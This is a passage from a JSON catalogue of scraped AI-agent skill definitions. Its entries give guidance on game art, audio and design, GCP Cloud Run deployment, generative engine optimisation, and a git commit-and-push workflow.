      "tags": [
        "typescript",
        "react",
        "node",
        "api",
        "ai",
        "document",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:24.285Z"
    },
    {
      "id": "antigravity-game-development-game-art",
      "name": "game-art",
      "slug": "game-development-game-art",
      "description": "Game art principles. Visual style selection, asset pipeline, animation workflow.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/game-development/game-art",
      "content": "\n# Game Art Principles\n\n> Visual design thinking for games - style selection, asset pipelines, and art direction.\n\n---\n\n## 1. Art Style Selection\n\n### Decision Tree\n\n```\nWhat feeling should the game evoke?\n│\n├── Nostalgic / Retro\n│   ├── Limited palette? → Pixel Art\n│   └── Hand-drawn feel? → Vector / Flash style\n│\n├── Realistic / Immersive\n│   ├── High budget? → PBR 3D\n│   └── Stylized realism? → Hand-painted textures\n│\n├── Approachable / Casual\n│   ├── Clean shapes? → Flat / Minimalist\n│   └── Soft feel? → Gradient / Soft shadows\n│\n└── Unique / Experimental\n    └── Define custom style guide\n```\n\n### Style Comparison Matrix\n\n| Style | Production Speed | Skill Floor | Scalability | Best For |\n|-------|------------------|-------------|-------------|----------|\n| **Pixel Art** | Medium | Medium | Hard to hire | Indie, retro |\n| **Vector/Flat** | Fast | Low | Easy | Mobile, casual |\n| **Hand-painted** | Slow | High | Medium | Fantasy, stylized |\n| **PBR 3D** | Slow | High | AAA pipeline | Realistic games |\n| **Low-poly** | Fast | Medium | Easy | Indie 3D |\n| **Cel-shaded** | Medium | Medium | Medium | Anime, cartoon |\n\n---\n\n## 2. Asset Pipeline Decisions\n\n### 2D Pipeline\n\n| Phase | Tool Options | Output |\n|-------|--------------|--------|\n| **Concept** | Paper, Procreate, Photoshop | Reference sheet |\n| **Creation** | Aseprite, Photoshop, Krita | Individual sprites |\n| **Atlas** | TexturePacker, Aseprite | Spritesheet |\n| **Animation** | Spine, DragonBones, Frame-by-frame | Animation data |\n| **Integration** | Engine import | Game-ready assets |\n\n### 3D Pipeline\n\n| Phase | Tool Options | Output |\n|-------|--------------|--------|\n| **Concept** | 2D art, Blockout | Reference |\n| **Modeling** | Blender, Maya, 3ds Max | High-poly mesh |\n| **Retopology** | Blender, ZBrush | Game-ready mesh |\n| **UV/Texturing** | Substance Painter, Blender | Texture maps |\n| **Rigging** | Blender, Maya | Skeletal rig |\n| **Animation** | Blender, Maya, Mixamo | Animation clips |\n| **Export** | FBX, glTF | Engine-ready |\n\n---\n\n## 3. Color Theory Decisions\n\n### Palette Selection\n\n| Goal | Strategy | Example |\n|------|----------|---------|\n| **Harmony** | Complementary or analogous | Nature games |\n| **Contrast** | High saturation differences | Action games |\n| **Mood** | Warm/cool temperature | Horror, cozy |\n| **Readability** | Value contrast over hue | Gameplay clarity |\n\n### Color Principles\n\n- **Hierarchy:** Important elements should pop\n- **Consistency:** Same object = same color family\n- **Context:** Colors read differently on backgrounds\n- **Accessibility:** Don't rely only on color\n\n---\n\n## 4. Animation Principles\n\n### The 12 Principles (Applied to Games)\n\n| Principle | Game Application |\n|-----------|------------------|\n| **Squash & Stretch** | Jump arcs, impacts |\n| **Anticipation** | Wind-up before attack |\n| **Staging** | Clear silhouettes |\n| **Follow-through** | Hair, capes after movement |\n| **Slow in/out** | Easing on transitions |\n| **Arcs** | Natural movement paths |\n| **Secondary Action** | Breathing, blinking |\n| **Timing** | Frame count = weight/speed |\n| **Exaggeration** | Readable from distance |\n| **Appeal** | Memorable design |\n\n### Frame Count Guidelines\n\n| Action Type | Typical Frames | Feel |\n|-------------|----------------|------|\n| Idle breathing | 4-8 | Subtle |\n| Walk cycle | 6-12 | Smooth |\n| Run cycle | 4-8 | Energetic |\n| Attack | 3-6 | Snappy |\n| Death | 8-16 | Dramatic |\n\n---\n\n## 5. Resolution & Scale Decisions\n\n### 2D Resolution by Platform\n\n| Platform | Base Resolution | Sprite Scale |\n|----------|-----------------|--------------|\n| Mobile | 1080p | 64-128px characters |\n| Desktop | 1080p-4K | 128-256px characters |\n| Pixel art | 320x180 to 640x360 | 16-32px characters |\n\n### Consistency Rule\n\nChoose a base unit and stick to it:\n- Pixel art: Work at 1x, scale up (never down)\n- HD art: Define DPI, maintain ratio\n- 3D: 1 unit = 1 meter (industry standard)\n\n---\n\n## 6. Asset Organization\n\n### Naming Convention\n\n```\n[type]_[object]_[variant]_[state].[ext]\n\nExamples:\nspr_player_idle_01.png\ntex_stone_wall_normal.png\nmesh_tree_oak_lod2.fbx\n```\n\n### Folder Structure Principle\n\n```\nassets/\n├── characters/\n│   ├── player/\n│   └── enemies/\n├── environment/\n│   ├── props/\n│   └── tiles/\n├── ui/\n├── effects/\n└── audio/\n```\n\n---\n\n## 7. Anti-Patterns\n\n| Don't | Do |\n|-------|-----|\n| Mix art styles randomly | Define and follow style guide |\n| Work at final resolution only | Create at source resolution |\n| Ignore silhouette readability | Test at gameplay distance |\n| Over-detail background | Focus detail on player area |\n| Skip color testing | Test on target display |\n\n---\n\n> **Remember:** Art serves gameplay. If it doesn't help the player, it's decoration.\n",
      "tags": [
        "ai",
        "workflow",
        "design",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:38.644Z"
    },
    {
      "id": "antigravity-game-development-game-audio",
      "name": "game-audio",
      "slug": "game-development-game-audio",
      "description": "Game audio principles. Sound design, music integration, adaptive audio systems.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/game-development/game-audio",
      "content": "\n# Game Audio Principles\n\n> Sound design and music integration for immersive game experiences.\n\n---\n\n## 1. Audio Category System\n\n### Category Definitions\n\n| Category | Behavior | Examples |\n|----------|----------|----------|\n| **Music** | Looping, crossfade, ducking | BGM, combat music |\n| **SFX** | One-shot, 3D positioned | Footsteps, impacts |\n| **Ambient** | Looping, background layer | Wind, crowd, forest |\n| **UI** | Immediate, non-3D | Button clicks, notifications |\n| **Voice** | Priority, ducking trigger | Dialogue, announcer |\n\n### Priority Hierarchy\n\n```\nWhen sounds compete for channels:\n\n1. Voice (highest - always audible)\n2. Player SFX (feedback critical)\n3. Enemy SFX (gameplay important)\n4. Music (mood, but duckable)\n5. Ambient (lowest - can drop)\n```\n\n---\n\n## 2. Sound Design Decisions\n\n### SFX Creation Approach\n\n| Approach | When to Use | Trade-offs |\n|----------|-------------|------------|\n| **Recording** | Realistic needs | High quality, time intensive |\n| **Synthesis** | Sci-fi, retro, UI | Unique, requires skill |\n| **Library samples** | Fast production | Common sounds, licensing |\n| **Layering** | Complex sounds | Best results, more work |\n\n### Layering Structure\n\n| Layer | Purpose | Example: Gunshot |\n|-------|---------|------------------|\n| **Attack** | Initial transient | Click, snap |\n| **Body** | Main character | Boom, blast |\n| **Tail** | Decay, room | Reverb, echo |\n| **Sweetener** | Special sauce | Shell casing, mechanical |\n\n---\n\n## 3. Music Integration\n\n### Music State System\n\n```\nGame State → Music Response\n│\n├── Menu → Calm, loopable theme\n├── Exploration → Ambient, atmospheric\n├── Combat detected → Transition to tension\n├── Combat engaged → Full battle music\n├── Victory → Stinger + calm transition\n├── Defeat → Somber stinger\n└── Boss → Unique, multi-phase track\n```\n\n### Transition Techniques\n\n| Technique | Use When | Feel |\n|-----------|----------|------|\n| **Crossfade** | Smooth mood shift | Gradual |\n| **Stinger** | Immediate event | Dramatic |\n| **Stem mixing** | Dynamic intensity | Seamless |\n| **Beat-synced** | Rhythmic gameplay | Musical |\n| **Queue point** | Next natural break | Clean |\n\n---\n\n## 4. Adaptive Audio Decisions\n\n### Intensity Parameters\n\n| Parameter | Affects | Example |\n|-----------|---------|---------|\n| **Threat level** | Music intensity | Enemy count |\n| **Health** | Filter, reverb | Low health = muffled |\n| **Speed** | Tempo, energy | Racing speed |\n| **Environment** | Reverb, EQ | Cave vs outdoor |\n| **Time of day** | Mood, volume | Night = quieter |\n\n### Vertical vs Horizontal\n\n| System | What Changes | Best For |\n|--------|--------------|----------|\n| **Vertical (layers)** | Add/remove instrument layers | Intensity scaling |\n| **Horizontal (segments)** | Different music sections | State changes |\n| **Combined** | Both | AAA adaptive scores |\n\n---\n\n## 5. 3D Audio Decisions\n\n### Spatialization\n\n| Element | 3D Positioned? | Reason |\n|---------|----------------|--------|\n| Player footsteps | No (or subtle) | Always audible |\n| Enemy footsteps | Yes | Directional awareness |\n| Gunfire | Yes | Combat awareness |\n| Music | No | Mood, non-diegetic |\n| Ambient zone | Yes (area) | Environmental |\n| UI sounds | No | Interface feedback |\n\n### Distance Behavior\n\n| Distance | Sound Behavior |\n|----------|----------------|\n| **Near** | Full volume, full frequency |\n| **Medium** | Volume falloff, high-freq rolloff |\n| **Far** | Low volume, low-pass filter |\n| **Max** | Silent or ambient hint |\n\n---\n\n## 6. Platform Considerations\n\n### Format Selection\n\n| Platform | Recommended Format | Reason |\n|----------|-------------------|--------|\n| PC | OGG Vorbis, WAV | Quality, no licensing |\n| Console | Platform-specific | Certification |\n| Mobile | MP3, AAC | Size, compatibility |\n| Web | WebM/Opus, MP3 fallback | Browser support |\n\n### Memory Budget\n\n| Game Type | Audio Budget | Strategy |\n|-----------|--------------|----------|\n| Mobile casual | 10-50 MB | Compressed, fewer variants |\n| PC indie | 100-500 MB | Quality focus |\n| AAA | 1+ GB | Full quality, many variants |\n\n---\n\n## 7. Mix Hierarchy\n\n### Volume Balance Reference\n\n| Category | Relative Level | Notes |\n|----------|----------------|-------|\n| **Voice** | 0 dB (reference) | Always clear |\n| **Player SFX** | -3 to -6 dB | Prominent but not harsh |\n| **Music** | -6 to -12 dB | Foundation, ducks for voice |\n| **Enemy SFX** | -6 to -9 dB | Important but not dominant |\n| **Ambient** | -12 to -18 dB | Subtle background |\n\n### Ducking Rules\n\n| When | Duck What | Amount |\n|------|-----------|--------|\n| Voice plays | Music, Ambient | -6 to -9 dB |\n| Explosion | All except explosion | Brief duck |\n| Menu open | Gameplay audio | -3 to -6 dB |\n\n---\n\n## 8. Anti-Patterns\n\n| Don't | Do |\n|-------|-----|\n| Play same sound repeatedly | Use variations (3-5 per sound) |\n| Max volume everything | Use proper mix hierarchy |\n| Ignore silence | Silence creates contrast |\n| One music track loops forever | Provide variety, transitions ",
      "tags": [
        "ai",
        "design",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:39.929Z"
    },
    {
      "id": "antigravity-game-development-game-design",
      "name": "game-design",
      "slug": "game-development-game-design",
      "description": "Game design principles. GDD structure, balancing, player psychology, progression.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/game-development/game-design",
      "content": "\n# Game Design Principles\n\n> Design thinking for engaging games.\n\n---\n\n## 1. Core Loop Design\n\n### The 30-Second Test\n\n```\nEvery game needs a fun 30-second loop:\n1. ACTION → Player does something\n2. FEEDBACK → Game responds\n3. REWARD → Player feels good\n4. REPEAT\n```\n\n### Loop Examples\n\n| Genre | Core Loop |\n|-------|-----------|\n| Platformer | Run → Jump → Land → Collect |\n| Shooter | Aim → Shoot → Kill → Loot |\n| Puzzle | Observe → Think → Solve → Advance |\n| RPG | Explore → Fight → Level → Gear |\n\n---\n\n## 2. Game Design Document (GDD)\n\n### Essential Sections\n\n| Section | Content |\n|---------|---------|\n| **Pitch** | One-sentence description |\n| **Core Loop** | 30-second gameplay |\n| **Mechanics** | How systems work |\n| **Progression** | How player advances |\n| **Art Style** | Visual direction |\n| **Audio** | Sound direction |\n\n### Principles\n\n- Keep it living (update regularly)\n- Visuals help communicate\n- Less is more (start small)\n\n---\n\n## 3. Player Psychology\n\n### Motivation Types\n\n| Type | Driven By |\n|------|-----------|\n| **Achiever** | Goals, completion |\n| **Explorer** | Discovery, secrets |\n| **Socializer** | Interaction, community |\n| **Killer** | Competition, dominance |\n\n### Reward Schedules\n\n| Schedule | Effect | Use |\n|----------|--------|-----|\n| **Fixed** | Predictable | Milestone rewards |\n| **Variable** | Addictive | Loot drops |\n| **Ratio** | Effort-based | Grind games |\n\n---\n\n## 4. Difficulty Balancing\n\n### Flow State\n\n```\nToo Hard → Frustration → Quit\nToo Easy → Boredom → Quit\nJust Right → Flow → Engagement\n```\n\n### Balancing Strategies\n\n| Strategy | How |\n|----------|-----|\n| **Dynamic** | Adjust to player skill |\n| **Selection** | Let player choose |\n| **Accessibility** | Options for all |\n\n---\n\n## 5. Progression Design\n\n### Progression Types\n\n| Type | Example |\n|------|---------|\n| **Skill** | Player gets better |\n| **Power** | Character gets stronger |\n| **Content** | New areas unlock |\n| **Story** | Narrative advances |\n\n### Pacing Principles\n\n- Early wins (hook quickly)\n- Gradually increase challenge\n- Rest beats between intensity\n- Meaningful choices\n\n---\n\n## 6. Anti-Patterns\n\n| ❌ Don't | ✅ Do |\n|----------|-------|\n| Design in isolation | Playtest constantly |\n| Polish before fun | Prototype first |\n| Force one way to play | Allow player expression |\n| Punish excessively | Reward progress |\n\n---\n\n> **Remember:** Fun is discovered through iteration, not designed on paper.\n",
      "tags": [
        "ai",
        "design",
        "document"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:41.048Z"
    },
    {
      "id": "antigravity-game-development",
      "name": "game-development",
      "slug": "game-development",
      "description": "Game development orchestrator. Routes to platform-specific skills based on project needs.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/game-development",
      "content": "\n# Game Development\n\n> **Orchestrator skill** that provides core principles and routes to specialized sub-skills.\n\n---\n\n## When to Use This Skill\n\nYou are working on a game development project. This skill teaches the PRINCIPLES of game development and directs you to the right sub-skill based on context.\n\n---\n\n## Sub-Skill Routing\n\n### Platform Selection\n\n| If the game targets... | Use Sub-Skill |\n|------------------------|---------------|\n| Web browsers (HTML5, WebGL) | `game-development/web-games` |\n| Mobile (iOS, Android) | `game-development/mobile-games` |\n| PC (Steam, Desktop) | `game-development/pc-games` |\n| VR/AR headsets | `game-development/vr-ar` |\n\n### Dimension Selection\n\n| If the game is... | Use Sub-Skill |\n|-------------------|---------------|\n| 2D (sprites, tilemaps) | `game-development/2d-games` |\n| 3D (meshes, shaders) | `game-development/3d-games` |\n\n### Specialty Areas\n\n| If you need... | Use Sub-Skill |\n|----------------|---------------|\n| GDD, balancing, player psychology | `game-development/game-design` |\n| Multiplayer, networking | `game-development/multiplayer` |\n| Visual style, asset pipeline, animation | `game-development/game-art` |\n| Sound design, music, adaptive audio | `game-development/game-audio` |\n\n---\n\n## Core Principles (All Platforms)\n\n### 1. The Game Loop\n\nEvery game, regardless of platform, follows this pattern:\n\n```\nINPUT  → Read player actions\nUPDATE → Process game logic (fixed timestep)\nRENDER → Draw the frame (interpolated)\n```\n\n**Fixed Timestep Rule:**\n- Physics/logic: Fixed rate (e.g., 50Hz)\n- Rendering: As fast as possible\n- Interpolate between states for smooth visuals\n\n---\n\n### 2. Pattern Selection Matrix\n\n| Pattern | Use When | Example |\n|---------|----------|---------|\n| **State Machine** | 3-5 discrete states | Player: Idle→Walk→Jump |\n| **Object Pooling** | Frequent spawn/destroy | Bullets, particles |\n| **Observer/Events** | Cross-system communication | Health→UI updates |\n| **ECS** | Thousands of similar entities | RTS units, particles |\n| **Command** | Undo, replay, networking | Input recording |\n| **Behavior Tree** | Complex AI decisions | Enemy AI |\n\n**Decision Rule:** Start with State Machine. Add ECS only when performance demands.\n\n---\n\n### 3. Input Abstraction\n\nAbstract input into ACTIONS, not raw keys:\n\n```\n\"jump\"  → Space, Gamepad A, Touch tap\n\"move\"  → WASD, Left stick, Virtual joystick\n```\n\n**Why:** Enables multi-platform, rebindable controls.\n\n---\n\n### 4. Performance Budget (60 FPS = 16.67ms)\n\n| System | Budget |\n|--------|--------|\n| Input | 1ms |\n| Physics | 3ms |\n| AI | 2ms |\n| Game Logic | 4ms |\n| Rendering | 5ms |\n| Buffer | 1.67ms |\n\n**Optimization Priority:**\n1. Algorithm (O(n²) → O(n log n))\n2. Batching (reduce draw calls)\n3. Pooling (avoid GC spikes)\n4. LOD (detail by distance)\n5. Culling (skip invisible)\n\n---\n\n### 5. AI Selection by Complexity\n\n| AI Type | Complexity | Use When |\n|---------|------------|----------|\n| **FSM** | Simple | 3-5 states, predictable behavior |\n| **Behavior Tree** | Medium | Modular, designer-friendly |\n| **GOAP** | High | Emergent, planning-based |\n| **Utility AI** | High | Scoring-based decisions |\n\n---\n\n### 6. Collision Strategy\n\n| Type | Best For |\n|------|----------|\n| **AABB** | Rectangles, fast checks |\n| **Circle** | Round objects, cheap |\n| **Spatial Hash** | Many similar-sized objects |\n| **Quadtree** | Large worlds, varying sizes |\n\n---\n\n## Anti-Patterns (Universal)\n\n| Don't | Do |\n|-------|-----|\n| Update everything every frame | Use events, dirty flags |\n| Create objects in hot loops | Object pooling |\n| Cache nothing | Cache references |\n| Optimize without profiling | Profile first |\n| Mix input with logic | Abstract input layer |\n\n---\n\n## Routing Examples\n\n### Example 1: \"I want to make a browser-based 2D platformer\"\n→ Start with `game-development/web-games` for framework selection\n→ Then `game-development/2d-games` for sprite/tilemap patterns\n→ Reference `game-development/game-design` for level design\n\n### Example 2: \"Mobile puzzle game for iOS and Android\"\n→ Start with `game-development/mobile-games` for touch input and stores\n→ Use `game-development/game-design` for puzzle balancing\n\n### Example 3: \"Multiplayer VR shooter\"\n→ `game-development/vr-ar` for comfort and immersion\n→ `game-development/3d-games` for rendering\n→ `game-development/multiplayer` for networking\n\n---\n\n> **Remember:** Great games come from iteration, not perfection. Prototype fast, then polish.\n",
      "tags": [
        "ai",
        "design",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:34.762Z"
    },
    {
      "id": "antigravity-gcp-cloud-run",
      "name": "gcp-cloud-run",
      "slug": "gcp-cloud-run",
      "description": "Specialized skill for building production-ready serverless applications on GCP. Covers Cloud Run services (containerized), Cloud Run Functions (event-driven), cold start optimization, and event-driven architecture with Pub/Sub.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/gcp-cloud-run",
      "content": "\n# GCP Cloud Run\n\n## Patterns\n\n### Cloud Run Service Pattern\n\nContainerized web service on Cloud Run\n\n**When to use**: ['Web applications and APIs', 'Need any runtime or library', 'Complex services with multiple endpoints', 'Stateless containerized workloads']\n\n```javascript\n```dockerfile\n# Dockerfile - Multi-stage build for smaller image\nFROM node:20-slim AS builder\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --only=production\n\nFROM node:20-slim\nWORKDIR /app\n\n# Copy only production dependencies\nCOPY --from=builder /app/node_modules ./node_modules\nCOPY src ./src\nCOPY package.json ./\n\n# Cloud Run uses PORT env variable\nENV PORT=8080\nEXPOSE 8080\n\n# Run as non-root user\nUSER node\n\nCMD [\"node\", \"src/index.js\"]\n```\n\n```javascript\n// src/index.js\nconst express = require('express');\nconst app = express();\n\napp.use(express.json());\n\n// Health check endpoint\napp.get('/health', (req, res) => {\n  res.status(200).send('OK');\n});\n\n// API routes\napp.get('/api/items/:id', async (req, res) => {\n  try {\n    const item = await getItem(req.params.id);\n    res.json(item);\n  } catch (error) {\n    console.error('Error:', error);\n    res.status(500).json({ error: 'Internal server error' });\n  }\n});\n\n// Graceful shutdown\nprocess.on('SIGTERM', () => {\n  console.log('SIGTERM received, shutting down gracefully');\n  server.close(() => {\n    console.log('Server closed');\n    process.exit(0);\n  });\n});\n\nconst PORT = process.env.PORT || 8080;\nconst server = app.listen(PORT, () => {\n  console.log(`Server listening on port ${PORT}`);\n});\n```\n\n```yaml\n# cloudbuild.yaml\nsteps:\n  # Build the container image\n  - name: 'gcr.io/cloud-builders/docker'\n    args: ['build', '-t', 'gcr.io/$PROJECT_ID/my-service:$COMMIT_SHA', '.']\n\n  # Push the container image\n  - name: 'gcr.io/cloud-builders/docker'\n    args: ['push', 'gcr.io/$PROJECT_ID/my-service:$COMMIT_SHA']\n\n  # Deploy to Cloud Run\n  - name: 'gcr.io/google.com/cloudsdktool/cloud-sdk'\n    entrypoint: gcloud\n    args:\n      - 'run'\n      - 'deploy'\n      - 'my-service'\n      - '--image=gcr.io/$PROJECT_ID/my-service:$COMMIT_SHA'\n      - '--region=us-central1'\n      - '--platform=managed'\n      - '--allow-unauthenticated'\n      - '--memory=512Mi'\n      - '--cpu=1'\n      - '--min-instances=1'\n      - '--max-instances=100'\n     \n```\n\n### Cloud Run Functions Pattern\n\nEvent-driven functions (formerly Cloud Functions)\n\n**When to use**: ['Simple event handlers', 'Pub/Sub message processing', 'Cloud Storage triggers', 'HTTP webhooks']\n\n```javascript\n```javascript\n// HTTP Function\n// index.js\nconst functions = require('@google-cloud/functions-framework');\n\nfunctions.http('helloHttp', (req, res) => {\n  const name = req.query.name || req.body.name || 'World';\n  res.send(`Hello, ${name}!`);\n});\n```\n\n```javascript\n// Pub/Sub Function\nconst functions = require('@google-cloud/functions-framework');\n\nfunctions.cloudEvent('processPubSub', (cloudEvent) => {\n  // Decode Pub/Sub message\n  const message = cloudEvent.data.message;\n  const data = message.data\n    ? JSON.parse(Buffer.from(message.data, 'base64').toString())\n    : {};\n\n  console.log('Received message:', data);\n\n  // Process message\n  processMessage(data);\n});\n```\n\n```javascript\n// Cloud Storage Function\nconst functions = require('@google-cloud/functions-framework');\n\nfunctions.cloudEvent('processStorageEvent', async (cloudEvent) => {\n  const file = cloudEvent.data;\n\n  console.log(`Event: ${cloudEvent.type}`);\n  console.log(`Bucket: ${file.bucket}`);\n  console.log(`File: ${file.name}`);\n\n  if (cloudEvent.type === 'google.cloud.storage.object.v1.finalized') {\n    await processUploadedFile(file.bucket, file.name);\n  }\n});\n```\n\n```bash\n# Deploy HTTP function\ngcloud functions deploy hello-http \\\n  --gen2 \\\n  --runtime nodejs20 \\\n  --trigger-http \\\n  --allow-unauthenticated \\\n  --region us-central1\n\n# Deploy Pub/Sub function\ngcloud functions deploy process-messages \\\n  --gen2 \\\n  --runtime nodejs20 \\\n  --trigger-topic my-topic \\\n  --region us-central1\n\n# Deploy Cloud Storage function\ngcloud functions deploy process-uploads \\\n  --gen2 \\\n  --runtime nodejs20 \\\n  --trigger-event-filters=\"type=google.cloud.storage.object.v1.finalized\" \\\n  --trigger-event-filters=\"bucket=my-bucket\" \\\n  --region us-central1\n```\n```\n\n### Cold Start Optimization Pattern\n\nMinimize cold start latency for Cloud Run\n\n**When to use**: ['Latency-sensitive applications', 'User-facing APIs', 'High-traffic services']\n\n```javascript\n## 1. Enable Startup CPU Boost\n\n```bash\ngcloud run deploy my-service \\\n  --cpu-boost \\\n  --region us-central1\n```\n\n## 2. Set Minimum Instances\n\n```bash\ngcloud run deploy my-service \\\n  --min-instances 1 \\\n  --region us-central1\n```\n\n## 3. Optimize Container Image\n\n```dockerfile\n# Use distroless for minimal image\nFROM node:20-slim AS builder\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --only=production\n\nFROM gcr.io/distroless/nodejs20-debian12\nWORKDIR /app\nCOPY --from=builder /app/node_modules ./node_modules\nCOPY src ./src\nCMD [\"src/index.js\"]\n```\n\n## 4. Lazy Initi",
      "tags": [
        "javascript",
        "node",
        "api",
        "ai",
        "image",
        "docker",
        "gcp",
        "rag",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:48.635Z"
    },
    {
      "id": "antigravity-geo-fundamentals",
      "name": "geo-fundamentals",
      "slug": "geo-fundamentals",
      "description": "Generative Engine Optimization for AI search engines (ChatGPT, Claude, Perplexity).",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/geo-fundamentals",
      "content": "\n# GEO Fundamentals\n\n> Optimization for AI-powered search engines.\n\n---\n\n## 1. What is GEO?\n\n**GEO** = Generative Engine Optimization\n\n| Goal | Platform |\n|------|----------|\n| Be cited in AI responses | ChatGPT, Claude, Perplexity, Gemini |\n\n### SEO vs GEO\n\n| Aspect | SEO | GEO |\n|--------|-----|-----|\n| Goal | #1 ranking | AI citations |\n| Platform | Google | AI engines |\n| Metrics | Rankings, CTR | Citation rate |\n| Focus | Keywords | Entities, data |\n\n---\n\n## 2. AI Engine Landscape\n\n| Engine | Citation Style | Opportunity |\n|--------|----------------|-------------|\n| **Perplexity** | Numbered [1][2] | Highest citation rate |\n| **ChatGPT** | Inline/footnotes | Custom GPTs |\n| **Claude** | Contextual | Long-form content |\n| **Gemini** | Sources section | SEO crossover |\n\n---\n\n## 3. RAG Retrieval Factors\n\nHow AI engines select content to cite:\n\n| Factor | Weight |\n|--------|--------|\n| Semantic relevance | ~40% |\n| Keyword match | ~20% |\n| Authority signals | ~15% |\n| Freshness | ~10% |\n| Source diversity | ~15% |\n\n---\n\n## 4. Content That Gets Cited\n\n| Element | Why It Works |\n|---------|--------------|\n| **Original statistics** | Unique, citable data |\n| **Expert quotes** | Authority transfer |\n| **Clear definitions** | Easy to extract |\n| **Step-by-step guides** | Actionable value |\n| **Comparison tables** | Structured info |\n| **FAQ sections** | Direct answers |\n\n---\n\n## 5. GEO Content Checklist\n\n### Content Elements\n\n- [ ] Question-based titles\n- [ ] Summary/TL;DR at top\n- [ ] Original data with sources\n- [ ] Expert quotes (name, title)\n- [ ] FAQ section (3-5 Q&A)\n- [ ] Clear definitions\n- [ ] \"Last updated\" timestamp\n- [ ] Author with credentials\n\n### Technical Elements\n\n- [ ] Article schema with dates\n- [ ] Person schema for author\n- [ ] FAQPage schema\n- [ ] Fast loading (< 2.5s)\n- [ ] Clean HTML structure\n\n---\n\n## 6. Entity Building\n\n| Action | Purpose |\n|--------|---------|\n| Google Knowledge Panel | Entity recognition |\n| Wikipedia (if notable) | Authority source |\n| Consistent info across web | Entity consolidation |\n| Industry mentions | Authority signals |\n\n---\n\n## 7. AI Crawler Access\n\n### Key AI User-Agents\n\n| Crawler | Engine |\n|---------|--------|\n| GPTBot | ChatGPT/OpenAI |\n| Claude-Web | Claude |\n| PerplexityBot | Perplexity |\n| Googlebot | Gemini (shared) |\n\n### Access Decision\n\n| Strategy | When |\n|----------|------|\n| Allow all | Want AI citations |\n| Block GPTBot | Don't want OpenAI training |\n| Selective | Allow some, block others |\n\n---\n\n## 8. Measurement\n\n| Metric | How to Track |\n|--------|--------------|\n| AI citations | Manual monitoring |\n| \"According to [Brand]\" mentions | Search in AI |\n| Competitor citations | Compare share |\n| AI-referred traffic | UTM parameters |\n\n---\n\n## 9. Anti-Patterns\n\n| ❌ Don't | ✅ Do |\n|----------|-------|\n| Publish without dates | Add timestamps |\n| Vague attributions | Name sources |\n| Skip author info | Show credentials |\n| Thin content | Comprehensive coverage |\n\n---\n\n> **Remember:** AI cites content that's clear, authoritative, and easy to extract. Be the best answer.\n\n---\n\n## Script\n\n| Script | Purpose | Command |\n|--------|---------|---------|\n| `scripts/geo_checker.py` | GEO audit (AI citation readiness) | `python scripts/geo_checker.py <project_path>` |\n\n",
      "tags": [
        "python",
        "claude",
        "ai",
        "agent",
        "gpt",
        "rag",
        "seo",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:49.893Z"
    },
    {
      "id": "antigravity-git-pushing",
      "name": "git-pushing",
      "slug": "git-pushing",
      "description": "Stage, commit, and push git changes with conventional commit messages. Use when user wants to commit and push changes, mentions pushing to remote, or asks to save and push their work. Also activates when user says \"push changes\", \"commit and push\", \"push this\", \"push to github\", or similar git workf",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/git-pushing",
      "content": "\n# Git Push Workflow\n\nStage all changes, create a conventional commit, and push to the remote branch.\n\n## When to Use\n\nAutomatically activate when the user:\n\n- Explicitly asks to push changes (\"push this\", \"commit and push\")\n- Mentions saving work to remote (\"save to github\", \"push to remote\")\n- Completes a feature and wants to share it\n- Says phrases like \"let's push this up\" or \"commit these changes\"\n\n## Workflow\n\n**ALWAYS use the script** - do NOT use manual git commands:\n\n```bash\nbash skills/git-pushing/scripts/smart_commit.sh\n```\n\nWith custom message:\n\n```bash\nbash skills/git-pushing/scripts/smart_commit.sh \"feat: add feature\"\n```\n\nScript handles: staging, conventional commit message, Claude footer, push with -u flag.\n",
      "tags": [
        "claude",
        "workflow"
      ],
      "useCases": [
        "Explicitly asks to push changes (\"push this\", \"commit and push\")",
        "Mentions saving work to remote (\"save to github\", \"push to remote\")",
        "Completes a feature and wants to share it",
        "Says phrases like \"let's push this up\" or \"commit these changes\""
      ],
      "scrapedAt": "2026-01-26T13:18:51.993Z"
    },
    {
      "id": "openhands-github",
      "name": "github",
      "slug": "github",
      "description": "You have access to an environment variable, `GITHUB_TOKEN`, which allows you to interact with",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/github.md",
